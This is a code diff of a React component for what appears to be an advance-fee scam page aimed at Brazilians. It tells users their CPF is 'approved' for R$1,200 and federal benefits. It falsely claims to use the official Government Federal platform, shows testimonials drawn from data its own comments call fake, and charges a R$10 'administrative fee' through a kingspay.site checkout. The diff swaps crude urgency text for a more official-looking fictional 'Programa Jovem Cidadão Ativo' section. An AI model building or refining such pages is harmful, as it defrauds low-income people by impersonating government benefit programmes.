@@ -4,9 +4,9 @@
 import type React from 'react';
 import { useState, useEffect } from 'react';
 import Image from 'next/image';
-import OfferTimer from '@/components/features/OfferTimer';
+// OfferTimer foi removido pois a seção que o continha foi eliminada
 import { Button } from '@/components/ui/button';
-import { CheckCircle, TrendingUp, ShieldCheck, Star, BadgePercent, Users, AlertTriangle, Clock, ShoppingCart, Gift, Award } from 'lucide-react';
+import { CheckCircle, TrendingUp, ShieldCheck, Users, DollarSign, BookOpen, LifeBuoy } from 'lucide-react'; // Adicionado DollarSign, BookOpen, LifeBuoy para novos ícones
 
 interface OfferStepProps {
   cpf: string | null;
@@ -55,8 +55,6 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
     }, 1500);
 
     const testimonialInterval = setInterval(() => {
-      // Embaralha a lista de depoimentos existente para mostrar diferentes combinações
-      // dos depoimentos únicos definidos em fakeTestimonialsData.
       setTestimonials(prev => [...prev].sort(() => 0.5 - Math.random()));
     }, 8000);
 
@@ -68,101 +66,88 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 
   const handleLiberarAcessoClick = () => {
     console.log("LIBERAR ACESSO IMEDIATO AGORA clicado! CPF:", cpf, "Redirect to R$10,00 checkout.");
-    // Replace with actual redirect to AppMax checkout URL
-    window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
     alert("🚨 ATENÇÃO: Você será redirecionado para o pagamento SEGURO da taxa administrativa de R$10,00. Liberação dos R$1.200,00 IMEDIATA após confirmação do PIX!");
+    window.location.href = "https://kingspay.site/checkout/taxa-inss-2025"; 
   };
 
   const formattedCpf = cpf || '***.***.***-**';
 
+  const benefitCards = [
+    {
+      icon: "https://placehold.co/60x60.png",
+      dataAiHint: "money coins",
+      title: "Apoio Financeiro Direto",
+      description: "Auxílio para cobrir despesas essenciais e impulsionar seus projetos. Verifique as condições e valores disponíveis."
+    },
+    {
+      icon: "https://placehold.co/60x60.png",
+      dataAiHint: "education book",
+      title: "Cursos e Capacitação",
+      description: "Acesso a plataformas de cursos online e presenciais para desenvolvimento de novas habilidades."
+    },
+    {
+      icon: "https://placehold.co/60x60.png",
+      dataAiHint: "support help",
+      title: "Suporte e Orientação",
+      description: "Canais de atendimento para dúvidas e suporte para o seu percurso no programa."
+    }
+  ];
+
   return (
     <div className="w-full max-w-4xl mx-auto p-4 md:p-6 space-y-8 bg-background text-foreground">
         
-        {/* Título Principal */}
         <div className="text-center">
            <h2 className="font-headline text-xl md:text-2xl font-bold mb-2 text-foreground">
             Parabéns, seu CPF {formattedCpf} foi aprovado para receber o dinheiro e os benefícios a seguir!
           </h2>
         </div>
 
-        {/* Benefícios disponíveis em destaque */}
-        <div className="bg-card rounded-xl shadow-xl p-6 md:p-8 border-l-8 border-accent animate-scale-in">
-            <h2 className="text-2xl md:text-3xl font-black text-card-foreground mb-6 text-center">Acesso LIBERADO para você:</h2>
-
-            <div className="grid md:grid-cols-3 gap-6 mb-8">
-                {[
-                    {
-                        nome: "Programa Auxílio Brasil",
-                        valor: "R$ 1200/mês",
-                        icon: "💰",
-                        descricao: "Benefício mensal direto na sua conta!",
-                    },
-                    {
-                        nome: "Tarifa Social de Energia",
-                        valor: "Até 65% de desconto",
-                        icon: "⚡",
-                        descricao: "Redução significativa na sua conta de luz!",
-                    },
-                    {
-                        nome: "Vale-Gás Federal",
-                        valor: "R$ 120 mensal",
-                        icon: "🔥",
-                        descricao: "Auxílio para comprar seu gás sem aperto!",
-                    },
-                    {
-                        nome: "Dinheiro Perdido",
-                        valor: "R$5000 por CPF",
-                        icon: "💸",
-                        descricao: "Valores esquecidos em contas e bancos!",
-                    },
-                ].map((beneficio, index) => (
-                    <div key={index} className="bg-accent/10 p-6 rounded-lg border border-accent/30 shadow-md transform hover:scale-105 transition-all duration-200">
-                        <div className="text-center">
-                            <div className="text-4xl mb-3 animate-pulse-slow">{beneficio.icon}</div>
-                            <h3 className="font-bold text-card-foreground mb-2 text-lg">{beneficio.nome}</h3>
-                            <p className="text-accent font-black text-2xl mb-2">{beneficio.valor}</p>
-                            <p className="text-sm text-muted-foreground">{beneficio.descricao}</p>
-                            <CheckCircle className="text-accent mx-auto mt-3 animate-fade-in" size={24} />
-                        </div>
-                    </div>
-                ))}
-            </div>
+        {/* Nova Seção de Benefícios */}
+        <div className="py-[60px] px-[20px] bg-white font-[Arial,sans-serif]">
+          <h2 className="text-center text-[2.2em] text-[#003366] mb-[50px]">
+            O que o Programa Oferece a Você:
+          </h2>
+          <div className="grid grid-cols-1 md:grid-cols-3 gap-[30px] max-w-[1200px] mx-auto">
+            {benefitCards.map((card, index) => (
+              <div key={index} className="bg-[#e6f2ff] p-[30px] rounded-[10px] text-center shadow-[0_4px_8px_rgba(0,0,0,0.1)] flex flex-col items-center">
+                <Image 
+                  src={card.icon} 
+                  alt={`Ícone ${card.title}`} 
+                  width={60} 
+                  height={60} 
+                  className="mb-[20px]"
+                  data-ai-hint={card.dataAiHint} 
+                />
+                <h3 className="text-[1.5em] text-[#003366] mb-[10px] font-semibold">{card.title}</h3>
+                <p className="text-[1.1em] text-[#555]">{card.description}</p>
+              </div>
+            ))}
+          </div>
         </div>
-          
-        {/* Lista de Benefícios */}
-        <ul className="space-y-2 text-left text-sm md:text-base max-w-md mx-auto bg-secondary/20 p-4 rounded-lg border border-primary/30 shadow">
-          {[
-            { icon: <ShoppingCart className="h-6 w-6 text-green-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>SAQUE IMEDIATO EM 5 MINUTOS:</strong> <span class='text-accent font-bold text-lg'>R$1.200,00</span> direto na sua conta Chave PIX <strong class='underline text-accent'>AGORA MESMO!</strong>" },
-            { icon: <Gift className="h-6 w-6 text-blue-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>ACESSO VIP GOV+ EXCLUSIVO:</strong> Plataforma Secreta de Benefícios (Valor R$297,00 - <span class='text-accent font-bold'>HOJE GRÁTIS</span>)" },
-            { icon: <Users className="h-6 w-6 text-purple-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>SUPORTE PREMIUM RELÂMPAGO 24/7:</strong> Atendimento VIP WhatsApp <span class='italic text-primary'>Ultra Rápido</span> e Prioritário para VOCÊ!" },
-            { icon: <Award className="h-6 w-6 text-yellow-500 mr-2 mt-0.5 shrink-0" />, text: "<strong class='text-primary'>BÔNUS SECRETO HOJE:</strong> Guia Exclusivo 'Nome Limpo em 7 Dias' (SPC/Serasa Destravado)!" },
-          ].map((benefit, index) => (
-            <li key={index} className="flex items-start">
-              {benefit.icon}
-              <span className="font-medium text-foreground" dangerouslySetInnerHTML={{ __html: benefit.text }} />
-            </li>
-          ))}
-        </ul>
-        
 
-        {/* Área de Urgência */}
-        <div className="bg-destructive/10 p-3 sm:p-4 rounded-lg border-2 border-destructive text-center shadow-xl text-destructive space-y-2">
-          <div className="flex flex-wrap items-center justify-center text-center font-bold text-md sm:text-lg md:text-xl mb-2">
-            <Clock className="h-8 w-8 mr-2" /> 
-            <span className="uppercase">CORRE! SEU TEMPO TÁ ACABANDO!</span>
-          </div>
-          <div className="text-center my-2">
-             <OfferTimer initialMinutes={4} initialSeconds={31} />
-          </div>
-          <p className="text-sm sm:text-md md:text-lg font-bold uppercase leading-tight">
-            <AlertTriangle className="inline-block h-6 w-6 mr-1" /> Atenção: <span className="text-2xl md:text-3xl underline">NÃO SEJA BURRO!</span><br/> Se você não sacar <strong >AGORA</strong>, seus <strong >R$1.200,00</strong> serão <strong >CANCELADOS</strong> e <strong >PERDIDOS PARA SEMPRE</strong> às 23:59 de <strong >HOJE!</strong><br/> Não tem choro nem vela, <strong className="text-xl">É AGORA OU NUNCA!</strong>
+        {/* Nova Seção de Chamada para Ação (CTA) */}
+        <div className="text-center py-[50px] px-[20px] bg-[#0056b3] font-[Arial,sans-serif] rounded-lg">
+          <h2 className="text-[2.2em] text-white mb-[20px] font-bold">
+            Pronto para dar o Próximo Passo?
+          </h2>
+          <p className="text-[1.2em] text-white max-w-[700px] mx-auto mb-[30px]">
+            Descubra se você se qualifica para os benefícios do Programa Jovem Cidadão Ativo e inicie sua jornada. Todo o processo é seguro, transparente e realizado via plataforma oficial do Governo Federal.
+          </p>
+          <button
+            onClick={handleLiberarAcessoClick}
+            className="bg-[#ffc107] text-[#003366] py-[18px] px-[40px] text-[1.6em] font-bold border-none rounded-[10px] cursor-pointer transition-colors duration-300 ease-linear hover:bg-[#e0a800] no-underline"
+          >
+            Verificar Minha Elegibilidade Agora
+          </button>
+          <p className="text-[0.9em] mt-[20px] text-[rgba(255,255,255,0.8)]">
+            Sua segurança e privacidade são prioridade.
           </p>
         </div>
-
-        {/* Seção de Preço */}
+          
+        {/* Seção de Preço - Mantida */}
         <div className="text-center p-4 md:p-6 bg-primary/10 rounded-xl shadow-lg border-2 border-accent ring-2 ring-accent/50 space-y-2">
-          <h3 className="font-headline text-xl md:text-2xl font-bold text-primary mb-1 uppercase">
-             <BadgePercent className="inline-block h-7 w-7 mr-1 text-accent" /> ÚNICA TAXA DE ACESSO!
+          <h3 className="font-headline text-xl md:text-2xl font-bold text-primary mb-1 uppercase flex items-center justify-center">
+             <CheckCircle className="inline-block h-7 w-7 mr-1 text-accent" /> ÚNICA TAXA DE ACESSO!
           </h3>
           <p className="text-muted-foreground line-through text-2xl md:text-3xl mb-0">DE R$297,00</p>
           <p className="text-7xl md:text-8xl font-extrabold text-accent mb-1">
@@ -184,7 +169,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           <ShieldCheck className="h-4 w-4 mr-1 text-green-600" /> Pagamento 100% SEGURO e Criptografado! Processado por AppMax.
         </div>
         
-        {/* SEÇÃO DE PROVA SOCIAL */}
+        {/* SEÇÃO DE PROVA SOCIAL - Mantida */}
         <div>
            <h3 className="font-headline text-lg md:text-xl font-bold text-foreground text-center mb-5 uppercase flex items-center justify-center">
             <Users className="mr-2 h-7 w-7" /> 
@@ -192,7 +177,7 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
           </h3>
           <div className="space-y-4">
             {testimonials.map((testimonial, index) => (
-              <div key={index} className="p-4 md:p-5">
+              <div key={index} className="p-4 md:p-5 bg-card shadow-lg rounded-lg border border-border">
                   <div className="flex items-start">
                       {testimonial.photoUrl && (
                           <Image
@@ -226,6 +211,8 @@ const OfferStep: React.FC<OfferStepProps> = ({ cpf }) => {
 
 export default OfferStep;
     
+    
+
     
 
     
